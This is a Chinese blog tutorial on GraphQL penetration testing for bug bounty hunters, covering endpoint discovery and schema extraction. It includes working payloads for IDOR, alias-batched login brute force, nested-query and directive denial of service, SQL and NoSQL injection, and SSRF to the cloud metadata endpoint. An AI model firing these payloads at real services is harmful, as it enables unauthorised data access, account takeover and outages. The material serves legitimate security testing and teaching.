#  GraphQL 渗透测试（面向漏洞赏金猎人）：从端点发现到高影响漏洞利用  
haidragon
                    haidragon  安全狗的自我修养   2026-02-24 03:10  
  
# 官网：http://securitytech.cc  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/R98u9GTbBns98B7ANbFVw32QMvicibczojSJFSPJhefpDb2eOaBEtL8LPtwDrSmyticb6LAIuqIPc8PdDHTwgP0Fmuos5nicVsbyQTFZqjBQhBE/640?wx_fmt=png&from=appmsg "")  
  
  
## 为什么 GraphQL 是漏洞猎人的“金矿”  
  
GraphQL 从根本上改变了攻防规则。  
  
传统 REST API 暴露固定端点和预定义数据结构，服务器严格控制返回的数据内容。而 GraphQL 使用单一端点，把查询结构的构造权交给客户端，允许客户端精确指定想要的数据形态。  
  
这种灵活性是开发者的福音，却是攻击者的金矿。  
  
因为客户端可以决定查询复杂度和字段内容，开发者往往忽略细粒度的字段级授权控制。他们常常只在顶层端点做认证，而忽略深层嵌套字段、内部管理型 mutation、以及后端 resolver 的授权检查，从而导致：  
- IDOR（越权访问）  
  
- 敏感数据泄露  
  
- 严重的 DoS 攻击  
  
# 像猎人一样绘制 GraphQL 攻击面  
  
你无法攻击你找不到的东西。GraphQL 端点往往不会显式暴露，因此发现过程必须系统化。  
## 一、现实世界中发现 GraphQL 端点的方法  
  
首先进行目录模糊测试（directory fuzzing），使用专门针对 GraphQL 的字典。  
  
常见生产路径包括：  
- /graphql  
  
- /api/graphql  
  
- /v1/graphql  
  
- /query  
  
同时注意可能暴露的开发 IDE：  
- /graphiql  
  
- /playground  
  
示例路径组合：  
```
staging.domain.com/graphqldevelopment.domain.com/graphqldev.domain.com/graphqltest.domain.com/graphqlstg.domain.com/graphqltst.domain.com/graphql...staging.domain.com/playgrounddevelopment.domain.com/playground
```  
## 二、从 URL、JS 文件、错误响应中寻找特征  
  
如果 fuzz 没有直接结果：  
1. 使用 Burp Suite 或浏览器开发者工具查看网络请求  
  
1. 查找：  
  
1. query  
  
1. mutation  
  
1. operationName  
  
1. POST 请求  
  
1. Content-Type: application/json  
  
1. 请求体中包含：  
  
分析前端 JS bundle，搜索：  
- Apollo  
  
- Relay  
  
- query  
  
- mutation  
  
往往可以找到隐藏的 GraphQL 路径。  
## 三、用最小探测确认端点  
  
发送“通用查询”：  
```
{"query":"{__typename}"}
```  
  
如果返回：  
```
{"data":{"__typename":"query"}}
```  
  
说明端点确认成功。  
  
或者发送错误语法：  
```
queryy { __typename }
```  
  
GraphQL 会返回特定语法错误提示。  
# Schema 提取：后端蓝图  
  
Schema 是 GraphQL 渗透的核心。  
  
它定义了：  
- 所有数据类型  
  
- 字段  
  
- Query / Mutation  
  
- 参数结构  
  
## 一、利用 Introspection 提取 Schema  
  
如果未禁用 introspection，可直接导出：  
```
query{  __schema {    queryType { name }    mutationType { name }    types {      name      fields {        name        args {          nametype{ name kind }}}}}}
```  
  
这将暴露整个攻击面。  
## 二、当 Introspection 被禁用时  
  
如果返回：  
- 400 Bad Request  
  
- Introspection is Disabled  
  
尝试绕过：  
- 在 __schema  
 后添加空格或换行  
  
- 改为 GET 请求  
  
- 使用 __type  
 逐个探测  
  
例如：  
```
query{  __type(name:"Query"){    name    fields { name }}}
```  
## 三、利用字段建议（Field Suggestions）重建 Schema  
  
GraphQL 会提示拼写建议：  
  
如果发送：  
```
ussr
```  
  
可能返回：  
```
Did you mean"user"?
```  
  
可利用工具 **Clairvoyance**  
 自动暴力枚举字段，通过错误提示逐步重建 Schema。  
## 使用 Clairvoyance 自动恢复 Schema  
### 步骤 A：准备高质量字典  
```
git clone https://github.com/nicholasaleks/high-frequency-vocabulary
```  
### 步骤 B：运行工具  
```
python3 -m clairvoyance http://localhost:5013/graphql \  -w ~/high-frequency-vocabulary/30k.txt \  -o schema-recovered.json
```  
### 步骤 C：生成自定义字典  
  
用 cewl 抓取前端页面词汇：  
```
cewl http://localhost:5013/ > custom_words.txt
```  
  
合并字典：  
```
cat custom_words.txt 30k.txt | sort -u > mega_wordlist.txt
```  
  
导入 GraphQL Voyager 可视化分析。  
# 高价值漏洞类型（真正能拿赏金的）  
## 1. BOLA / IDOR  
  
测试方法：  
- 登录用户 A  
  
- 抓取自己的查询  
  
- 修改 ID 为用户 B  
  
示例：  
```
query{  getProfile(id:101){    email    phone    private_address}}
```  
  
若成功返回他人数据，则为严重漏洞。  
## 2. 嵌套字段过度暴露  
```
query{  user(id:1){    name    passwordHash    role    internal_notes}}
```  
## 3. Resolver 授权绕过  
```
mutation{  deleteStorySnaps(id:"target_id"){    success}}
```  
## 4. Alias 滥用与批量攻击  
```
mutation{attempt1: login(user:"admin", pass:"123456"){ token }attempt2: login(user:"admin", pass:"password"){ token }}
```  
  
绕过 HTTP 层限速。  
## 5. 嵌套深度 DoS  
```
query{  author {    posts {      author {        posts {          title}}}}}
```  
  
触发递归解析耗尽资源。  
## 6. 字段重复消耗  
```
query{  pastes {    title    content    content    content}}
```  
## 7. Directive 过载  
```
query{  pastes {    title @aa@aa@aa}}
```  
  
用于测试资源耗尽。  
## 8. Object Limit 覆盖  
```
query{  pastes(limit:100000, public:true){    content}}
```  
## 9. 数组批量查询  
```
curl http://localhost:5013/graphql \-H"Content-Type: application/json" \-d '[{"query":"query {systemHealth}"},{"query":"query {systemHealth}"}]'
```  
## 10. Resolver 注入（SQLi / NoSQLi）  
  
SQL 注入示例：  
```
query{  pastes(filter:"test' OR '1'='1'--"){    content}}
```  
  
NoSQL 示例：  
```
query{  user(password:{"$ne":null}){    token}}
```  
## 11. SSRF  
```
mutation{  importPaste(host:"169.254.169.254", port:80, path:"/latest/meta-data/"){    result}}
```  
# 高级利用技巧  
- Alias 过载绕过 WAF  
  
- Fragment 循环调用造成解析崩溃  
  
- 从 JS 文件中提取隐藏 admin mutation  
  
- 字段模糊测试发现未公开字段  
  
# 实战流程建议  
1. 发现端点  
  
1. 提取 Schema  
  
1. 多角色授权测试  
  
1. 深度参数 fuzz  
  
1. 构造高影响 PoC  
  
# 实战常用工具  
- Burp + InQL  
  
- GraphQLmap  
  
- Clairvoyance  
  
- Altair  
  
- Graphw00f  
  
- curl  
  
# 如何写高质量报告  
  
不要提交：  
- Introspection 开启  
  
- 字段建议存在  
  
必须提交：  
- 具体漏洞  
  
- 可利用查询  
  
- 影响说明（越权 / 数据泄露 / 接管）  
  
- 公众号:安全狗的自我修养  
  
- vx:2207344074  
  
- http://  
gitee.com/haidragon  
  
- http://  
github.com/haidragon  
  
- bilibili:haidragonx  
  
##   
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/R98u9GTbBnvUgOgugaRsy3iamId40Qe9iaiaK5cOWjEQrfibVTEwKB5GvfDWH49XaGxywddJqedr7jJF8zgp4aicd23RdRqlVZQ8yoh5viaHx4RG8/640?wx_fmt=png&from=appmsg "")  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/vBZcZNVQERHYgfyicoHWcBVxH85UOBNaPZeRlpCaIfwnM0IM4vnVugkAyDFJlhe1Rkalbz0a282U9iaVU12iaEiahw/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&randomid=z84f6pb5&tp=webp#imgIndex=5 "")  
  
****- ![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/vBZcZNVQERHYgfyicoHWcBVxH85UOBNaPMJPjIWnCTP3EjrhOXhJsryIkR34mCwqetPF7aRmbhnxBbiaicS0rwu6w/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&randomid=omk5zkfc&tp=webp#imgIndex=5 "")  
  
